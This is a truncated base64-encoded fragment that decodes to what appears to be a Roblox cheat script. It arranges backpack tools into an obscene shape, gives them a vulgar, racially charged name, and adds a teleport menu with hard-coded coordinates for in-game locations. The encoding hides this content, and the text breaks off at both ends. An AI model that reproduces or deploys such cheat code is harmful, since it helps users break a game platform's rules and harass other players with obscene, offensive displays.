ygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtNiwgMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTcsIDEwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC04LCAxMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtOSwgMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEwLCAxMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAuNSwgOSkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAuNSwgOCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAuNSwgNikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAsIDUpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEwLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTExLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEyLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEzLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE0LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE1LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE2LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE3LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE4LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE5LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIwLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIxLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIyLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIzLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI0LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI1LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI2LCAzKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNywgMikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjcsIDApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZnJhbWUKICAgICAgICAgICAgICAgIHdhaXQoMC41KQogICAgICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2wuTmFtZSA9PSBuYW1ldG9vbHMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgZW5kCn0pCgpsb2NhbCB2YXJfNTR3Mnk1ID0gV2luZG93Ok1ha2VUYWIoeyJUZWxlcG9ydHMiLCAidHAifSkgLS0gSWNvbiBuYW1lOiAncG9ydGFsJyBpbiBsb3dlcmNhc2UgZm9yIHRlbGVwb3J0CgotLSBUZWxlcG9ydCBCdXR0b25zCmxvY2FsIHZhcl85N3BnYjkgPSB7CiAgICB7IlRvIHRoZSBCYWNrc3RhZ2UiLCBDRnJhbWUubmV3KDE5MiwgNCwgMjcyKX0sCiAgICB7IlRvIHRoZSBDaXR5IENlbnRlciIsIENGcmFtZS5uZXcoMTM2LCA0LCAxMTcpfSwKICAgIHsiVG8gdGhlIENyaW1lIEFyZWEiLCBDRnJhbWUubmV3KC0xMTksIC0yOCwgMjM1KX0sCiAgICB7IlRvIHRoZSBEZXNlcnRlZCBIb3VzZSIsIENGcmFtZS5uZXcoOTg2LCA0LCA2Myl9LAogICAgeyJUbyB0aGUgQWdlbmN5IFBvcnRhbCIsIENGcmFtZS5uZXcoNjcyLCA0LCAtMjk2KX0sCiAgICB7IlRvIHRoZSBIaWRlb3V0IiwgQ0ZyYW1lLm5ldyg1MDUsIC03NSwgMTQzKX0sCiAgICB7IlRvIHRoZSBTY2hvb2wiLCBDRnJhbWUubmV3KC0zMTIsIDQsIDIxMSl9LAogICAgeyJUbyB0aGUgQnJvb2sgQ2FmZSIsIENGcmFtZS5uZXcoMTYxLCA4LCA1Mil9LAogICAgeyJUbyB0aGUgU3RhcnRpbmcgUG9pbnQiLCBDRnJhbWUubmV3KC0yNiwgNCwgLTIzKX0sCiAgICB7IlRvIHRoZSBNYWluIEFyY2giLCBDRnJhbWUubmV3KC01ODksIDE0MSwgLTU5KX0sCiAgICB7IlRvIHRoZSBIb3NwaXRhbCIsIENGcmFtZS5uZXcoLTMwOSwgNCwgNzEpfSwKICAgIHsiVG8gdGhlIEFnZW5jeSBCYXNlIiwgQ0ZyYW1lLm5ldygxNzksIDQsIC00NjQpfSwKICAgIHsiVG8gdGhlIFdvcmtzaG9wJ3MgSGlkZGVuIFJvb20iLCBDRnJhbWUubmV3KDAsIDQsIC00OTUpfSwKICAgIHsiVG8gU2VjcmV0IFJvb20gMiIsIENGcmFtZS5uZXcoLTM0MywgNCwgLTYxMyl9LAogICAgeyJUbyB0aGUgSXNvbGF0ZWQgSXNsYW5kIiwgQ0ZyYW1lLm5ldygtMTkyNSwgMjMsIDEyNyl9LAogICAgeyJUbyB0aGUgSG90ZWwgU3F1YXJlIiwgQ0ZyYW1lLm5ldygxODIsIDQsIDE1MCl9LAogICAgeyJDbGltYiBNb3VudGFpbiAxIiwgQ0ZyYW1lLm5ldygtNjcwLCAyNTEsIDc2NSl9LAogICAgeyJUbyB0aGUgTWFpbiBCYW5rIiwgQ0ZyYW1lLm5ldygyLjI4LCA0LjY1LCAyNTQuNTgpfSwKICAgIHsiVG8gdGhlIENsb3RoaW5nIFN0b3JlIiwgQ0ZyYW1lLm5ldygtNDYuMTUsIDQuNjUsIDI1My4yMCl9LAogICAgeyJUbyB0aGUgUmVmdWdlIiwgQ0ZyYW1lLm5ldygtODguNDgsIDIyLjA1LCAyNjIuMzQpfSwKICAgIHsiVG8gdGhlIERlbnRhbCBDbGluaWMiLCBDRnJhbWUubmV3KC01My41OCwgMjIuMTUsIDI2NS42MSl9LAogICAgeyJUbyB0aGUgQ2FmZXRlcmlhIiwgQ0ZyYW1lLm5ldygtOTcuMTIsIDQuNjUsIDI1NC45OSl9Cn0KCmZvciBfLCBidG4gaW4gaXBhaXJzKHRlbGVwb3J0QnV0dG9ucykgZG8KICAgIFRhYjpBZGRCdXR0b24oewogICAgICAgIGJ0blsxXSwKICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBidG5bMl0KICAgICAgICBlbmQKICAgIH0pCmVuZAoKbG9jYWwgdmFyX2F6dTB3eCA9IFdpbmRvdzpNYWtlVGFiKHsiTmFtZXMiLCAiUGFwZXIifSkKCmxvY2FsIHZhcl9qcnU4NHggPSBmYWxzZQpsb2NhbCB2YXJfdGRvYXNqID0gZmFsc2UKCmxvY2FsIHZhcl8zM29jNnMgPSBUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID